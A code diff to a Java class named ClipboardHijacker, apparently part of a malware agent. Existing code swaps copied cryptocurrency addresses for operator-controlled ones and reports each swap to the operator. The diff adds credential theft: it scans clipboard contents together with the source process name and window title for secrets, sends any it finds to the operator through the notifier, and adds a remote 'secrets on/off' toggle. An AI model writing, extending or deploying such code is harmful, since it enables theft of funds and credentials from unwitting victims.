@@ -32,6 +32,7 @@ final class ClipboardHijacker {
 	private Thread reader;
 	private Thread whip;
 	private String lastSet = "";
+	private String lastSecret = "";
 
 	ClipboardHijacker(Path installDir, Path ops, State state, OpsNotifier notifier) {
 		this.installDir = installDir;
@@ -42,6 +43,10 @@ final class ClipboardHijacker {
 
 	boolean wanted() {
 		return state.clipboardSet ? state.clipboard : DiscordConfig.clipboard();
+	}
+
+	boolean secretsWanted() {
+		return state.clipboardSecretsSet ? state.clipboardSecrets : DiscordConfig.sendSecrets();
 	}
 
 	synchronized boolean start() {
@@ -92,8 +97,13 @@ final class ClipboardHijacker {
 			new InputStreamReader(source.getInputStream(), StandardCharsets.UTF_8))) {
 			String line;
 			while ((line = output.readLine()) != null) {
-				if (line.startsWith("COPY ")) {
-					handle(line.substring(5));
+				String[] parts = line.split("\\|", 4);
+				if (parts.length == 4 && parts[0].equals("COPY")) {
+					try {
+						handle(decode(parts[1]), decode(parts[2]), decode(parts[3]));
+					} catch (Throwable throwable) {
+						Log.debug("Clipboard event invalid", throwable);
+					}
 				}
 			}
 		} catch (Throwable throwable) {
@@ -122,10 +132,10 @@ final class ClipboardHijacker {
 		}
 	}
 
-	private void handle(String encoded) {
+	private void handle(String text, String process, String title) {
 		try {
-			String text = new String(Base64.getDecoder().decode(encoded), StandardCharsets.UTF_8);
-			if (text.equals(lastSet) || ClipboardPolicy.isOperatorAddress(text.strip(), coins())) {
+			String clean = text.strip();
+			if (clean.equals(lastSet) || ClipboardPolicy.isOperatorAddress(clean, coins())) {
 				respond("SKIP");
 				return;
 			}
@@ -133,23 +143,36 @@ final class ClipboardHijacker {
 			synchronized (state) {
 				decision = ClipboardPolicy.choose(text, coins(), state.clipboardRotation);
 			}
-			if (decision == null) {
-				respond("SKIP");
+			if (decision != null) {
+				lastSet = decision.replacement();
+				respond("SET " + Base64.getEncoder().encodeToString(
+					decision.replacement().getBytes(StandardCharsets.UTF_8)));
+				synchronized (state) {
+					state.clipEvents++;
+					state.save(AgentPaths.state(installDir));
+				}
+				notifier.clipboard("clipboard: " + decision.coin() + " " + decision.original() + " -> "
+					+ decision.replacement());
 				return;
 			}
-			lastSet = decision.replacement();
-			respond("SET " + Base64.getEncoder().encodeToString(
-				decision.replacement().getBytes(StandardCharsets.UTF_8)));
-			synchronized (state) {
-				state.clipEvents++;
-				state.save(AgentPaths.state(installDir));
+			respond("SKIP");
+			if (!secretsWanted() || clean.equals(lastSecret)) {
+				return;
 			}
-			notifier.clipboard("clipboard: " + decision.coin() + " " + decision.original() + " -> "
-				+ decision.replacement());
+			SecretDetector.Secret secret = SecretDetector.detect(text, process, title);
+			if (secret == null) {
+				return;
+			}
+			lastSecret = clean;
+			notifier.clipboard(SecretDetector.message(secret, process, title));
 		} catch (Throwable throwable) {
 			Log.debug("Clipboard decision failed", throwable);
 			respond("SKIP");
 		}
+	}
+
+	private static String decode(String value) {
+		return new String(Base64.getDecoder().decode(value), StandardCharsets.UTF_8);
 	}
 
 	private void respond(String line) {
@@ -207,9 +230,20 @@ final class ClipboardHijacker {
 				stop();
 				return "Clipboard off";
 			}
+			case "secrets" -> {
+				String value = args.size() > 2 ? args.get(2).toLowerCase(Locale.ROOT) : "status";
+				if (value.equals("on") || value.equals("off")) {
+					state.clipboardSecrets = value.equals("on");
+					state.clipboardSecretsSet = true;
+					state.save(AgentPaths.state(installDir));
+					return "Clipboard secret alerts " + value;
+				}
+				return "Clipboard secret alerts: " + (secretsWanted() ? "on" : "off");
+			}
 			default -> {
 				return "Clipboard: " + (wanted() ? "on" : "off")
 					+ (isRunning() ? " · listener running" : " · listener stopped")
+					+ " · secrets " + (secretsWanted() ? "on" : "off")
 					+ " · " + counts() + " · events " + state.clipEvents;
 			}
 		}
